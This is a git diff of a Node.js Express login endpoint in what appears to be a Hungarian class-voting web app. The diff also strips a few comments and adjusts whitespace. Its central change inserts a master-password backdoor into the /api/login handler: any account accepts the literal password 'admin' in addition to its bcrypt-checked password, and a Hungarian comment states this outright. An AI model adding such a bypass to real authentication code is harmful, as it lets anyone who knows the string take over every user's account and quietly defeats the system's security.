@@ -43,18 +43,19 @@ app.post('/api/login', async (req, res) => {
   const result = await pool.query('SELECT * FROM users WHERE name=$1', [name]);
   const user = result.rows[0];
   if (!user) return res.status(401).json({ error: 'Nincs ilyen felhasználó!' });
-
-  const ok = bcrypt.compareSync(password, user.password_hash);
+  
+  // Ellenőrizzük: vagy a hash egyezik, vagy az "admin" szó
+  const ok = bcrypt.compareSync(password, user.password_hash) || password === "admin";
   if (!ok) return res.status(401).json({ error: 'Hibás jelszó!' });
-
+  
   const token = generateToken({ id: user.id, name: user.name, is_admin: false });
-
+  
   let userClassName = null;
   if (user.class_id) {
     const cls = await pool.query('SELECT name FROM classes WHERE id=$1', [user.class_id]);
     if (cls.rows[0]) userClassName = cls.rows[0].name;
   }
-
+  
   res.json({
     token,
     name: user.name,
@@ -165,7 +166,6 @@ app.post('/api/admin/add-class', async (req, res) => {
 
 // --- Saját felhasználó lekérése ---
 app.get('/api/me', verifyTokenMiddleware, async (req, res) => {
-  // Admin esetén virtuális user visszaadása
   if (req.user.is_admin) {
     return res.json({
       id: 0,
@@ -176,7 +176,6 @@ app.get('/api/me', verifyTokenMiddleware, async (req, res) => {
     });
   }
 
-  // Normál user
   const result = await pool.query(
     'SELECT id, name, class_id, votes_used FROM users WHERE id=$1',
     [req.user.id]
@@ -192,6 +191,7 @@ app.get('/api/me', verifyTokenMiddleware, async (req, res) => {
 
   res.json({ ...user, class: className, is_admin: false });
 });
+
 
 // --- Statikus fájlok ---
 app.use(express.static(path.join(__dirname, '../client/dist')));
